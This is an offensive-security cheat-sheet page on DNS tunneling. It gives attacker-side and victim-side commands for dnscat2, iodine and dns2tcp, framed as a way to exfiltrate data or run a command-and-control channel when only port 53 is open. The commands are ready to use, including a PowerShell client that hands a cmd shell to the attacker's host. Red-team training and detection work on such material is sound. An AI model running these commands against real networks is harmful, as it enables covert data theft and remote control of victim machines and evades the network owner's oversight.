---
title: "DNS Tunneling"
---

# 🌐 DNS Tunneling

> Exfiltrate data or create C2 channel over DNS queries.
> Useful when only port 53 (UDP/TCP) is allowed.

::: tip 📖 How it works?
DNS queries are almost always allowed outbound. Tools encode data in domain name requests (e.g., `data.$DOMAIN`) and extract responses via TXT/CNAME.
:::

## 🐱 dnscat2 – Full tunnel over DNS

### Server (attacker)

```bash
# Basic
ruby dnscat2.rb --dns domain=$DOMAIN --secret=$SECRET_KEY --no-cache

# With custom interface/port
ruby dnscat2.rb --dns host=$LHOST,port=53,domain=$DOMAIN --secret=$SECRET_KEY --no-cache
```

### Client (victim)

::: code-group

```bash [Unix]
dnscat2 --dns domain=$DOMAIN --secret=$SECRET_KEY
```

```powershell [Windows]
# Install
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Import and run
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver $LHOST -Domain $DOMAIN -PreSharedSecret $SECRET_KEY -Exec cmd
```

:::

### Create TCP forwarding from dnscat2 session

```bash
# Inside dnscat2 console
listen 127.0.0.1:$LPORT $TARGET_HOST:$RPORT
```

## 🧂 iodine – IP-over-DNS

```bash
# Server (attacker)
iodined -f -c -P $SECRET_KEY 10.0.0.1 tunnel.$DOMAIN

# Client (victim)
iodine -f -P $SECRET_KEY tunnel.$DOMAIN
```

> After connection, you get a virtual interface (e.g., 10.0.0.2). Use SSH or any TCP tool over that IP.

### 🔀 dns2tcp – Simple TCP redirection

```bash
# Server config (/etc/dns2tcpd.conf)
listen = $LHOST
port = 53
domain = $DOMAIN
resource = ssh:127.0.0.1:22

# Server
dns2tcpd -f /etc/dns2tcpd.conf

# Client
dns2tcpc -z $DOMAIN -l $LPORT -r ssh
```
